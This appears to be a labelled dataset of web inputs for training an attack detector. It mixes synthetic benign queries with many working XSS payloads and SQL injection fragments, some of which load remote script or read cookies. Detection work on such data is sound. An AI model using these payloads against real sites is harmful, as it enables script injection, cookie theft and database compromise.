+{"input":"search=top 10 python blogs","label":"benign"}
+{"input":"{\"user\": \"kaitlyn27\", \"action\": \"view\", \"timestamp\": \"1994-06-05T09:32:54\"}","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><link id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/link>","label":"XSS"}
+{"input":"{\"user\": \"dustinbowers\", \"action\": \"delete\", \"timestamp\": \"1994-05-10T11:56:36\"}","label":"benign"}
+{"input":"<aside onfocusout=alert(1) tabindex=1 id=x><\/aside><input autofocus>","label":"XSS"}
+{"input":"Great article!","label":"benign"}
+{"input":"<mark draggable=\"true\" ondragend=\"alert(1)\">test<\/mark>","label":"XSS"}
+{"input":"<style>:target {color: red;}<\/style><progress id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/progress>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><optgroup id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/optgroup>","label":"XSS"}
+{"input":"<picture onbeforecopy=\"alert(1)\" contenteditable>test<\/picture>","label":"XSS"}
+{"input":"<var oncut=\"alert(1)\" contenteditable>test<\/var>","label":"XSS"}
+{"input":"GET \/tag\/posts HTTP\/1.1","label":"benign"}
+{"input":"GET \/category\/tag\/blog HTTP\/1.1","label":"benign"}
+{"input":"<dir draggable=\"true\" ondragstart=\"alert(1)\">test<\/dir>","label":"XSS"}
+{"input":"Helpful tutorial!","label":"benign"}
+{"input":"<style onbeforecopy=\"alert(1)\" contenteditable>test<\/style>","label":"XSS"}
+{"input":"<form onbeforepaste=\"alert(1)\" contenteditable>test<\/form>","label":"XSS"}
+{"input":"<meter onpaste=\"alert(1)\" contenteditable>test<\/meter>","label":"XSS"}
+{"input":"%3B%2500%20%20%20%20Nullbyte","label":"SQLi"}
+{"input":"<h1 oncontextmenu=\"alert(1)\">test<\/h1>","label":"XSS"}
+{"input":"<embed id=x onfocusin=alert(1) type=text\/html>","label":"XSS"}
+{"input":"GET \/category\/blog\/app HTTP\/1.1","label":"benign"}
+{"input":"<aside onkeypress=\"alert(1)\" contenteditable>test<\/aside>","label":"XSS"}
+{"input":"GET \/blog\/wp-content HTTP\/1.1","label":"benign"}
+{"input":"AnD 1","label":"SQLi"}
+{"input":"<datalist id=x tabindex=1 onactivate=alert(1)><\/datalist>","label":"XSS"}
+{"input":"{\"user\": \"cfletcher\", \"action\": \"delete\", \"timestamp\": \"1980-10-20T04:34:45\"}","label":"benign"}
+{"input":"Nice tutorial!","label":"benign"}
+{"input":"<sup draggable=\"true\" ondragenter=\"alert(1)\">test<\/sup>","label":"XSS"}
+{"input":"<header onblur=alert(1) tabindex=1 id=x><\/header><input autofocus>","label":"XSS"}
+{"input":"<input type=\"submit\">","label":"XSS"}
+{"input":"{\"user\": \"teresa40\", \"action\": \"edit\", \"timestamp\": \"2004-07-06T12:01:15\"}","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><figure style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/figure>","label":"XSS"}
+{"input":"<link draggable=\"true\" ondragstart=\"alert(1)\">test<\/link>","label":"XSS"}
+{"input":"<dir onmouseup=\"alert(1)\">test<\/dir>","label":"XSS"}
+{"input":"<track onbeforepaste=\"alert(1)\" contenteditable>test<\/track>","label":"XSS"}
+{"input":"{\"user\": \"mike16\", \"action\": \"edit\", \"timestamp\": \"2005-09-20T00:59:38\"}","label":"benign"}
+{"input":"<embed onmouseleave=\"alert(1)\">test<\/embed>","label":"XSS"}
+{"input":"Great read!","label":"benign"}
+{"input":"<p onmouseover=\"alert(1)\">test<\/p>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><shadow style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/shadow>","label":"XSS"}
+{"input":"Hello, my name is Mr. Michael Miller.","label":"benign"}
+{"input":"<style>:target {color:red;}<\/style><h1 id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/h1>","label":"XSS"}
+{"input":"<output draggable=\"true\" ondragenter=\"alert(1)\">test<\/output>","label":"XSS"}
+{"input":"{\"user\": \"oevans\", \"action\": \"view\", \"timestamp\": \"2020-10-02T17:48:59\"}","label":"benign"}
+{"input":"<style>:target {color:red;}<\/style><style id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/style>","label":"XSS"}
+{"input":"how to machine learning tutorial","label":"benign"}
+{"input":"Great tutorial!","label":"benign"}
+{"input":"<noscript onpaste=\"alert(1)\" contenteditable>test<\/noscript>","label":"XSS"}
+{"input":"<details id=x tabindex=1 onactivate=alert(1)><\/details>","label":"XSS"}
+{"input":"<ol onbeforecopy=\"alert(1)\" contenteditable>test<\/ol>","label":"XSS"}
+{"input":"<hr id=x tabindex=1 ondeactivate=alert(1)><\/hr><input id=y autofocus>","label":"XSS"}
+{"input":"<em onpaste=\"alert(1)\" contenteditable>test<\/em>","label":"XSS"}
+{"input":"GET \/explore\/explore\/categories HTTP\/1.1","label":"benign"}
+{"input":"<q oncut=\"alert(1)\" contenteditable>test<\/q>","label":"XSS"}
+{"input":"<div style=\"background:url(test5.svg)\">PRESS ENTER<\/div>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"{\"user\": \"adam15\", \"action\": \"edit\", \"timestamp\": \"1982-09-16T03:26:25\"}","label":"benign"}
+{"input":"<figure onmouseover=\"alert(1)\">test<\/figure>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><bdi style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/bdi>","label":"XSS"}
+{"input":"<font oncut=\"alert(1)\" contenteditable>test<\/font>","label":"XSS"}
+{"input":"<keygen onfocusout=alert(1) tabindex=1 id=x><\/keygen><input autofocus>","label":"XSS"}
+{"input":"<slot onbeforecut=\"alert(1)\" contenteditable>test<\/slot>","label":"XSS"}
+{"input":"<strong id=x tabindex=1 onbeforedeactivate=alert(1)><\/strong><input autofocus>","label":"XSS"}
+{"input":"<nav onmouseout=\"alert(1)\">test<\/nav>","label":"XSS"}
+{"input":"<!--><scRipT src=\/\/14.rs>","label":"XSS"}
+{"input":"<input onmouseenter=\"alert(1)\">test<\/input>","label":"XSS"}
+{"input":"Helpful tutorial!","label":"benign"}
+{"input":"Contact: walkerlance@example.net","label":"benign"}
+{"input":"Nice read!","label":"benign"}
+{"input":"<dfn onbeforecopy=\"alert(1)\" contenteditable>test<\/dfn>","label":"XSS"}
+{"input":"<br oncut=\"alert(1)\" contenteditable>test<\/br>","label":"XSS"}
+{"input":"<center oncopy=\"alert(1)\" contenteditable>test<\/center>","label":"XSS"}
+{"input":"Hello, my name is Joan Morris.","label":"benign"}
+{"input":"best cooking books","label":"benign"}
+{"input":"@,@ OTNI 1 TCELES NOINU 1-","label":"SQLi"}
+{"input":"GET \/tag HTTP\/1.1","label":"benign"}
+{"input":"<dialog id=x tabindex=1 onbeforedeactivate=alert(1)><\/dialog><input autofocus>","label":"XSS"}
+{"input":"<rt onclick=\"alert(1)\">test<\/rt>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><slot id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/slot>","label":"XSS"}
+{"input":"<aside oncontextmenu=\"alert(1)\">test<\/aside>","label":"XSS"}
+{"input":"name=margaretwilson&email=sandra48@example.com","label":"benign"}
+{"input":"Hello, my name is Jackie Oliver.","label":"benign"}
+{"input":"<ol id=x tabindex=1 onbeforeactivate=alert(1)><\/ol>","label":"XSS"}
+{"input":"<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http:\/\/xssme.html5sec.org\/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(\/cookie = '(.*?)'\/)[1]) };xhr.send();<\/script>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><body id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/body>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><abbr id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/abbr>","label":"XSS"}
+{"input":"<s id=x tabindex=1 ondeactivate=alert(1)><\/s><input id=y autofocus>","label":"XSS"}
+{"input":"-2%0a","label":"SQLi"}
+{"input":"<svg><pre onload=alert(1)><\/pre>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><embed id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/embed>","label":"XSS"}
+{"input":"GET \/app\/posts HTTP\/1.1","label":"benign"}
+{"input":"<main onclick=\"alert(1)\">test<\/main>","label":"XSS"}
+{"input":"<area draggable=\"true\" ondragstart=\"alert(1)\">test<\/area>","label":"XSS"}
+{"input":"Contact: chrisgalloway@example.net","label":"benign"}
+{"input":"<tfoot onmousemove=\"alert(1)\">test<\/tfoot>","label":"XSS"}
+{"input":"Contact: weberelizabeth@example.net","label":"benign"}
+{"input":"<nobr onmousedown=\"alert(1)\">test<\/nobr>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><input id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/input>","label":"XSS"}
+{"input":"Contact: christopher51@example.org","label":"benign"}
+{"input":"<footer draggable=\"true\" ondragstart=\"alert(1)\">test<\/footer>","label":"XSS"}
+{"input":"Contact: cainchristian@example.com","label":"benign"}
+{"input":"<ul onkeyup=\"alert(1)\" contenteditable>test<\/ul>","label":"XSS"}
+{"input":"Interesting guide!","label":"benign"}
+{"input":"GET \/main\/app HTTP\/1.1","label":"benign"}
+{"input":"<cite onmouseleave=\"alert(1)\">test<\/cite>","label":"XSS"}
+{"input":"<applet onbeforecut=\"alert(1)\" contenteditable>test<\/applet>","label":"XSS"}
+{"input":"<isindex draggable=\"true\" ondragleave=\"alert(1)\">test<\/isindex>","label":"XSS"}
+{"input":"<bdo draggable=\"true\" ondragenter=\"alert(1)\">test<\/bdo>","label":"XSS"}
+{"input":"<output draggable=\"true\" ondragstart=\"alert(1)\">test<\/output>","label":"XSS"}
+{"input":"+--3,2,1 TCELES NOINU '1-","label":"SQLi"}
+{"input":"<del onclick=\"alert(1)\">test<\/del>","label":"XSS"}
+{"input":"<optgroup onkeyup=\"alert(1)\" contenteditable>test<\/optgroup>","label":"XSS"}
+{"input":"<data id=x tabindex=1 onbeforedeactivate=alert(1)><\/data><input autofocus>","label":"XSS"}
+{"input":"what is python?","label":"benign"}
+{"input":"username=susan74&password=P4I&z@Go@U","label":"benign"}
+{"input":"';a=prompt,a()\/\/","label":"XSS"}
+{"input":"python examples in 2025","label":"benign"}
+{"input":"<tt onmouseleave=\"alert(1)\">test<\/tt>","label":"XSS"}
+{"input":"Contact: bensonhannah@example.net","label":"benign"}
+{"input":"<tr oncontextmenu=\"alert(1)\">test<\/tr>","label":"XSS"}
+{"input":"alert&#x28;1&#x29","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><tbody ondrop=alert(1) contenteditable>drop here<\/tbody>","label":"XSS"}
+{"input":"<style onmouseout=\"alert(1)\">test<\/style>","label":"XSS"}
+{"input":"Contact: steve97@example.org","label":"benign"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><listing id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/listing>","label":"XSS"}
+{"input":";%00    NuLlByTe","label":"SQLi"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><progress ondrop=alert(1) contenteditable>drop here<\/progress>","label":"XSS"}
+{"input":"username=kyleholden&password=5@6UnTf^Wf","label":"benign"}
+{"input":"<embed draggable=\"true\" ondrag=\"alert(1)\">test<\/embed>","label":"XSS"}
+{"input":"<del onmousemove=\"alert(1)\">test<\/del>","label":"XSS"}
+{"input":"{\"user\": \"evansjessica\", \"action\": \"edit\", \"timestamp\": \"1988-10-30T23:00:33\"}","label":"benign"}
+{"input":"<textarea id=ta><\/textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(\/cookie = '(.*?)'\/)[1])<\/script>","label":"XSS"}
+{"input":"1'%09 ORDER\/*random*\/ BY%0d 1--+\/**\/","label":"SQLi"}
+{"input":"\/*start*\/-2\/*end*\/","label":"SQLi"}
+{"input":"<th onmouseleave=\"alert(1)\">test<\/th>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><wbr ondragover=alert(1) contenteditable>drop here<\/wbr>","label":"XSS"}
+{"input":"feedback=Inside art someone put thousand.","label":"benign"}
+{"input":"<b onmouseleave=\"alert(1)\">test<\/b>","label":"XSS"}
+{"input":"search=how to travel tutorial","label":"benign"}
+{"input":"what is machine learning?","label":"benign"}
+{"input":"<x onmousemove=alert(1)>hover this!","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><optgroup id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/optgroup>","label":"XSS"}
+{"input":"GET \/search\/blog HTTP\/1.1","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><p ondragover=alert(1) contenteditable>drop here<\/p>","label":"XSS"}
+{"input":"best machine learning books","label":"benign"}
+{"input":"<object data=\/ onload=alert(1)>","label":"XSS"}
+{"input":"<style onpaste=\"alert(1)\" contenteditable>test<\/style>","label":"XSS"}
+{"input":"Helpful guide!","label":"benign"}
+{"input":"<listing id=x tabindex=1 onactivate=alert(1)><\/listing>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><br id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/br>","label":"XSS"}
+{"input":"<dd onmousedown=\"alert(1)\">test<\/dd>","label":"XSS"}
+{"input":"<center ondblclick=\"alert(1)\">test<\/center>","label":"XSS"}
+{"input":"Hello, my name is Holly Jimenez.","label":"benign"}
+{"input":"<isindex id=x tabindex=1 ondeactivate=alert(1)><\/isindex><input id=y autofocus>","label":"XSS"}
+{"input":"what is finance?","label":"benign"}
+{"input":"<summary onmousemove=\"alert(1)\">test<\/summary>","label":"XSS"}
+{"input":"<u onkeydown=\"alert(1)\" contenteditable>test<\/u>","label":"XSS"}
+{"input":"<link onkeydown=\"alert(1)\" contenteditable>test<\/link>","label":"XSS"}
+{"input":"<x onxxx=alert(1) 1='","label":"XSS"}
+{"input":"<div draggable=\"true\" ondrag=\"alert(1)\">test<\/div>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><rtc id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/rtc>","label":"XSS"}
+{"input":"<output id=x tabindex=1 onbeforeactivate=alert(1)><\/output>","label":"XSS"}
+{"input":"what is cooking?","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><strong style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/strong>","label":"XSS"}
+{"input":"<form ondblclick=\"alert(1)\">test<\/form>","label":"XSS"}
+{"input":"GET \/tag HTTP\/1.1","label":"benign"}
+{"input":"<small onmouseenter=\"alert(1)\">test<\/small>","label":"XSS"}
+{"input":"<spacer onbeforepaste=\"alert(1)\" contenteditable>test<\/spacer>","label":"XSS"}
+{"input":"Great read!","label":"benign"}
+{"input":"GET \/tag HTTP\/1.1","label":"benign"}
+{"input":"<spacer draggable=\"true\" ondragleave=\"alert(1)\">test<\/spacer>","label":"XSS"}
+{"input":"GET \/explore\/app HTTP\/1.1","label":"benign"}
+{"input":"1' oRdEr bY 1,2--+","label":"SQLi"}
+{"input":"<style>@keyframes slidein {}<\/style><output style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/output>","label":"XSS"}
+{"input":"GET \/wp-content\/tags HTTP\/1.1","label":"benign"}
+{"input":"Finding the table name","label":"SQLi"}
+{"input":"<u onbeforecut=\"alert(1)\" contenteditable>test<\/u>","label":"XSS"}
+{"input":"<if expr=\"new ActiveXObject('htmlfile').parentWindow.alert(2)\"><\/if>","label":"XSS"}
+{"input":"<button onblur=alert(1) id=x><\/button><input autofocus>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><canvas style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/canvas>","label":"XSS"}
+{"input":"Hello, my name is Mary Mathis.","label":"benign"}
+{"input":"Hello, my name is Tyler Burgess.","label":"benign"}
+{"input":"<p id=x tabindex=1 onactivate=alert(1)><\/p>","label":"XSS"}
+{"input":"Hello, my name is Joshua Cherry.","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><ol style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/ol>","label":"XSS"}
+{"input":"GET \/main\/main HTTP\/1.1","label":"benign"}
+{"input":"username=tony12&password=ZKS^5_Rwr4","label":"benign"}
+{"input":"{\"user\": \"tara82\", \"action\": \"view\", \"timestamp\": \"1985-06-06T03:15:36\"}","label":"benign"}
+{"input":"<form onmouseover=\"alert(1)\">test<\/form>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><strike id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/strike>","label":"XSS"}
+{"input":"<del oncut=\"alert(1)\" contenteditable>test<\/del>","label":"XSS"}
+{"input":"how to cooking tutorial","label":"benign"}
+{"input":"<p draggable=\"true\" ondragend=\"alert(1)\">test<\/p>","label":"XSS"}
+{"input":"Great tutorial!","label":"benign"}
+{"input":"<xss id=x tabindex=1 onfocusin=alert(1)><\/xss>","label":"XSS"}
+{"input":"Hello, my name is Debra Thompson.","label":"benign"}
+{"input":"what is travel?","label":"benign"}
+{"input":"Contact: walter37@example.com","label":"benign"}
+{"input":"GET \/explore HTTP\/1.1","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><shadow ondragover=alert(1) contenteditable>drop here<\/shadow>","label":"XSS"}
+{"input":"name=spencerkim&email=hutchinsonnancy@example.org","label":"benign"}
+{"input":"<dt onmouseup=\"alert(1)\">test<\/dt>","label":"XSS"}
+{"input":"<h1 onmouseenter=\"alert(1)\">test<\/h1>","label":"XSS"}
+{"input":"top 10 cooking blogs","label":"benign"}
+{"input":"{\"user\": \"amyayala\", \"action\": \"delete\", \"timestamp\": \"1999-07-12T15:01:04\"}","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><optgroup id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/optgroup>","label":"XSS"}
+{"input":"<--`<img\/src=` onerror=alert(1)> --!>","label":"XSS"}
+{"input":"<command draggable=\"true\" ondrag=\"alert(1)\">test<\/command>","label":"XSS"}
+{"input":"<rtc draggable=\"true\" ondragleave=\"alert(1)\">test<\/rtc>","label":"XSS"}
+{"input":"{\"user\": \"justingould\", \"action\": \"edit\", \"timestamp\": \"1998-01-08T13:16:30\"}","label":"benign"}
+{"input":"finance examples in 2025","label":"benign"}
+{"input":"<audio id=x tabindex=1 ondeactivate=alert(1)><\/audio><input id=y autofocus>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><legend style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/legend>","label":"XSS"}
+{"input":"search=music examples in 2025","label":"benign"}
+{"input":"<dfn onblur=alert(1) tabindex=1 id=x><\/dfn><input autofocus>","label":"XSS"}
+{"input":"%40%40variable%20%20%20%20global%20variable","label":"SQLi"}
+{"input":"GET \/category\/posts\/wp-content HTTP\/1.1","label":"benign"}
+{"input":"<tt onmousemove=\"alert(1)\">test<\/tt>","label":"XSS"}
+{"input":"<picture draggable=\"true\" ondragleave=\"alert(1)\">test<\/picture>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><summary style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/summary>","label":"XSS"}
+{"input":"<picture draggable=\"true\" ondrag=\"alert(1)\">test<\/picture>","label":"XSS"}
+{"input":"<rt onkeydown=\"alert(1)\" contenteditable>test<\/rt>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><dl id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/dl>","label":"XSS"}
+{"input":"<center onmouseover=\"alert(1)\">test<\/center>","label":"XSS"}
+{"input":"<link draggable=\"true\" ondragenter=\"alert(1)\">test<\/link>","label":"XSS"}
+{"input":"Insightful post!","label":"benign"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><sub ondragover=alert(1) contenteditable>drop here<\/sub>","label":"XSS"}
+{"input":"<head onpaste=\"alert(1)\" contenteditable>test<\/head>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><var id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/var>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><center id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/center>","label":"XSS"}
+{"input":"<frameset oncontextmenu=\"alert(1)\">test<\/frameset>","label":"XSS"}
+{"input":"feedback=Board eye research center office fish product.","label":"benign"}
+{"input":"<span oncontextmenu=\"alert(1)\">test<\/span>","label":"XSS"}
+{"input":"Hello, my name is Douglas Parker.","label":"benign"}
+{"input":"<div id=\"90\"><!-- Up to Opera 10.63 -->","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><basefont id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/basefont>","label":"XSS"}
+{"input":"<image onblur=alert(1) tabindex=1 id=x><\/image><input autofocus>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><header id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/header>","label":"XSS"}
+{"input":"Contact: joseph94@example.net","label":"benign"}
+{"input":"<script onmousemove=\"alert(1)\">test<\/script>","label":"XSS"}
+{"input":"how to python tutorial","label":"benign"}
+{"input":"Contact: megan11@example.org","label":"benign"}
+{"input":"<bdi id=x tabindex=1 onactivate=alert(1)><\/bdi>","label":"XSS"}
+{"input":"<shadow id=x tabindex=1 onbeforeactivate=alert(1)><\/shadow>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><ins id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/ins>","label":"XSS"}
+{"input":"<isindex onmouseenter=\"alert(1)\">test<\/isindex>","label":"XSS"}
+{"input":"{\"user\": \"parrishbarbara\", \"action\": \"download\", \"timestamp\": \"1991-06-24T06:27:47\"}","label":"benign"}
+{"input":"Helpful read!","label":"benign"}
+{"input":"<tr oncut=\"alert(1)\" contenteditable>test<\/tr>","label":"XSS"}
+{"input":"machine learning examples in 2025","label":"benign"}
+{"input":"<title onmouseleave=\"alert(1)\">test<\/title>","label":"XSS"}
+{"input":"how to machine learning tutorial","label":"benign"}
+{"input":"<label ondblclick=\"alert(1)\">test<\/label>","label":"XSS"}
+{"input":"<code onfocusout=alert(1) tabindex=1 id=x><\/code><input autofocus>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><abbr ondragover=alert(1) contenteditable>drop here<\/abbr>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><datalist id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/datalist>","label":"XSS"}
+{"input":"<button onkeydown=\"alert(1)\" contenteditable>test<\/button>","label":"XSS"}
+{"input":"<xmp oncontextmenu=\"alert(1)\">test<\/xmp>","label":"XSS"}
+{"input":"Insightful tutorial!","label":"benign"}
+{"input":"<track onmousedown=\"alert(1)\">test<\/track>","label":"XSS"}
+{"input":"<marquee onpaste=\"alert(1)\" contenteditable>test<\/marquee>","label":"XSS"}
+{"input":"<\/svg>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"Contact: richard67@example.org","label":"benign"}
+{"input":"Hello, my name is Sandra Chapman.","label":"benign"}
+{"input":"Great read!","label":"benign"}
+{"input":"GET \/app\/tags HTTP\/1.1","label":"benign"}
+{"input":"Contact: josephdelgado@example.net","label":"benign"}
+{"input":"<blockquote oncontextmenu=\"alert(1)\">test<\/blockquote>","label":"XSS"}
+{"input":"<figcaption id=x tabindex=1 onbeforedeactivate=alert(1)><\/figcaption><input autofocus>","label":"XSS"}
+{"input":"Contact: joneskristina@example.com","label":"benign"}
+{"input":"what is cooking?","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><strike style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/strike>","label":"XSS"}
+{"input":"<cite oncopy=\"alert(1)\" contenteditable>test<\/cite>","label":"XSS"}
+{"input":"<datalist id=x tabindex=1 onbeforeactivate=alert(1)><\/datalist>","label":"XSS"}
+{"input":"Hello, my name is Theresa Montoya.","label":"benign"}
+{"input":"Contact: anthony05@example.com","label":"benign"}
+{"input":"<img draggable=\"true\" ondragstart=\"alert(1)\">test<\/img>","label":"XSS"}
+{"input":"GET \/tags\/categories HTTP\/1.1","label":"benign"}
+{"input":"<td draggable=\"true\" ondragenter=\"alert(1)\">test<\/td>","label":"XSS"}
+{"input":"Contact: heidigoodwin@example.com","label":"benign"}
+{"input":"<menu onmousemove=\"alert(1)\">test<\/menu>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><strike id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/strike>","label":"XSS"}
+{"input":"Insightful read!","label":"benign"}
+{"input":"<sCriPt\/src=\/\/14.rs?","label":"XSS"}
+{"input":"<main id=x tabindex=1 onbeforedeactivate=alert(1)><\/main><input autofocus>","label":"XSS"}
+{"input":"<rtc draggable=\"true\" ondragenter=\"alert(1)\">test<\/rtc>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><script style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/script>","label":"XSS"}
+{"input":"<progress onblur=alert(1) tabindex=1 id=x><\/progress><input autofocus>","label":"XSS"}
+{"input":"<label id=x tabindex=1 onbeforedeactivate=alert(1)><\/label><input autofocus>","label":"XSS"}
+{"input":"<picture id=x tabindex=1 onfocusin=alert(1)><\/picture>","label":"XSS"}
+{"input":"<address ondblclick=\"alert(1)\">test<\/address>","label":"XSS"}
+{"input":"<canvas id=x tabindex=1 ondeactivate=alert(1)><\/canvas><input id=y autofocus>","label":"XSS"}
+{"input":"\/*start*\/1' GROUP BY 1,2,3--+\/*end*\/","label":"SQLi"}
+{"input":"<summary onkeydown=\"alert(1)\" contenteditable>test<\/summary>","label":"XSS"}
+{"input":"<xmp id=x tabindex=1 onfocusin=alert(1)><\/xmp>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><style style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/style>","label":"XSS"}
+{"input":"<frame ondblclick=\"alert(1)\">test<\/frame>","label":"XSS"}
+{"input":"<s oncontextmenu=\"alert(1)\">test<\/s>","label":"XSS"}
+{"input":"<meta onkeyup=\"alert(1)\" contenteditable>test<\/meta>","label":"XSS"}
+{"input":"<img src ?itworksonchrome?\\\/onerror = alert(1)???","label":"XSS"}
+{"input":"<cite draggable=\"true\" ondragend=\"alert(1)\">test<\/cite>","label":"XSS"}
+{"input":"<form onmouseout=\"alert(1)\">test<\/form>","label":"XSS"}
+{"input":"<button onkeyup=\"alert(1)\" contenteditable>test<\/button>","label":"XSS"}
+{"input":"<frame id=x tabindex=1 onactivate=alert(1)><\/frame>","label":"XSS"}
+{"input":"<datalist onmouseup=\"alert(1)\">test<\/datalist>","label":"XSS"}
+{"input":"<blink onmouseup=\"alert(1)\">test<\/blink>","label":"XSS"}
+{"input":"search=what is music?","label":"benign"}
+{"input":"page=7&sort=asc","label":"benign"}
+{"input":"<td oncopy=\"alert(1)\" contenteditable>test<\/td>","label":"XSS"}
+{"input":"<div id=\"61\"><div  style=\"\\63&#9\\06f&#10\\0006c&#12\\00006F&#13\\R:\\000072 Ed;color\\0\\bla:yellow\\0\\bla;col\\0\\00 \\&#xA0or:blue;\">XXX<\/div>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"<X OnXxx=1","label":"XSS"}
+{"input":"<bdo oncontextmenu=\"alert(1)\">test<\/bdo>","label":"XSS"}
+{"input":"what is finance?","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><table id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/table>","label":"XSS"}
+{"input":"`        Backtick","label":"SQLi"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><table ondrop=alert(1) contenteditable>drop here<\/table>","label":"XSS"}
+{"input":"<sub draggable=\"true\" ondragstart=\"alert(1)\">test<\/sub>","label":"XSS"}
+{"input":"{\"user\": \"wcoleman\", \"action\": \"view\", \"timestamp\": \"1973-08-16T13:29:31\"}","label":"benign"}
+{"input":"Contact: anthonyfrancis@example.org","label":"benign"}
+{"input":"GET \/wp-content HTTP\/1.1","label":"benign"}
+{"input":"Helpful tutorial!","label":"benign"}
+{"input":"<mark id=x tabindex=1 onactivate=alert(1)><\/mark>","label":"XSS"}
+{"input":"<span onmousedown=\"alert(1)\">test<\/span>","label":"XSS"}
+{"input":"<frame oncopy=\"alert(1)\" contenteditable>test<\/frame>","label":"XSS"}
+{"input":"<section oncopy=\"alert(1)\" contenteditable>test<\/section>","label":"XSS"}
+{"input":"<dir onmouseleave=\"alert(1)\">test<\/dir>","label":"XSS"}
+{"input":"Hello, my name is Christina Simpson.","label":"benign"}
+{"input":"<listing draggable=\"true\" ondrag=\"alert(1)\">test<\/listing>","label":"XSS"}
+{"input":"how to machine learning tutorial","label":"benign"}
